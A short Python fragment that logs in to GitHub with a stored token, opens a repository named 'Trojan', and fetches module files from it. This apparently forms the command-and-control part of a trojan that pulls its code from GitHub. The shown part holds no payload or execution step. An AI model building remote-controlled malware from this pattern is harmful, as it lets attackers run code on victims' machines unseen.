import github3


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'Username' #your_Username
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content